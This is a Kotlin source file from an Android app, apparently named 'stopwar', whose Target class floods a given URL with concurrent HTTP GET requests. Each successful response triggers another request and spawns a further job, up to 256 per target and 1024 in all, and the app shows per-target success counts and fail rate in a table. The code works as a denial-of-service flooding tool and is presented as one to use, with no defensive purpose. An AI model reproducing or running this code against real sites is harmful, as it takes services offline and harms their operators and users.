package com.kosenko.stopwar

import okhttp3.OkHttpClient
import java.util.concurrent.atomic.AtomicInteger
import okhttp3.Callback
import okhttp3.Request
import okhttp3.Call
import okio.IOException
import okhttp3.Response
import android.content.Context
import android.widget.TableRow
import android.widget.TextView

data class Target(
    val url: String,
    var jobsCount: AtomicInteger = AtomicInteger(0),
    var successCount: AtomicInteger = AtomicInteger(0),
    var failureCount: AtomicInteger = AtomicInteger(0),
) {
    companion object {
        val httpClient = OkHttpClient()
        var isRun = false
        var jobsCount = AtomicInteger(0)
        val TOTAL_JOBS_LIMIT_DEFAULT = 1024U
        var totalJobsLimit = AtomicInteger(TOTAL_JOBS_LIMIT_DEFAULT.toInt())
        val TARGET_JOBS_LIMIT_DEFAULT = 256U
        var targetJobsLimit = AtomicInteger(TARGET_JOBS_LIMIT_DEFAULT.toInt())
        val SHOW_TARGET_LIMIT_DEFAULT = 2U
        var showTargetLimit = AtomicInteger(SHOW_TARGET_LIMIT_DEFAULT.toInt())
    }

    fun failRate(): UInt {
        val sc = successCount.toFloat()
        val fc = failureCount.toFloat()
        return (fc / (sc + fc) * 10000 / 100).toUInt()
    }
    private fun hit() {
        val req = Request.Builder()
            .url(url).build()
        val call = httpClient.newCall(req)
        call.enqueue(
            object: Callback {
                override fun onFailure(call: Call, e: IOException) {
                    failureCount.incrementAndGet()
                    jobsCount.decrementAndGet()
                    Target.jobsCount.decrementAndGet()
                }
    
                override fun onResponse(call: Call, response: Response) {
                    if (response.isSuccessful) {
                        successCount.incrementAndGet()
                        if (isRun && Target.jobsCount.get() < totalJobsLimit.get() && jobsCount.get() < targetJobsLimit.get()) {
                            hit()
                            spawn()
                        } else {
                            jobsCount.decrementAndGet()
                            Target.jobsCount.decrementAndGet()
                        }
                    } else {
                        failureCount.incrementAndGet()
                        jobsCount.decrementAndGet()
                        Target.jobsCount.decrementAndGet()
                    }
                }
            }
        )
    }
    
    fun spawn() {
        if (isRun && Target.jobsCount.get() < totalJobsLimit.get() && jobsCount.get() < targetJobsLimit.get()) {
            jobsCount.incrementAndGet()
            Target.jobsCount.incrementAndGet()
            hit()
        }
    }
    fun newRow(ctx: Context): TableRow {
        val result = TableRow(ctx)
    
        val rlp = TableRow.LayoutParams(
            TableRow.LayoutParams.WRAP_CONTENT,
            TableRow.LayoutParams.WRAP_CONTENT,
            1F
        )
    
        result.addView(newCol(ctx, rlp, url))
        result.addView(newNumericCol(ctx, rlp, jobsCount.toString()))
        result.addView(newNumericCol(ctx, rlp, successCount.toString()))
        result.addView(newNumericCol(ctx, rlp, failureCount.toString()))
        result.addView(newNumericCol(ctx, rlp, failRate().toString()))
    
        return result
    }
    
    private fun newCol(ctx: Context, lp: TableRow.LayoutParams, v: String): TextView {
        val result = TextView(ctx)
        result.text = v
        result.layoutParams = lp
        result.setPadding(8, 0, 0, 0)
        return result
    }
    
    private fun newNumericCol(ctx: Context, lp: TableRow.LayoutParams, v: String): TextView {
        val result = newCol(ctx, lp, v)
        result.textAlignment = TextView.TEXT_ALIGNMENT_TEXT_END
        return result
    }
}
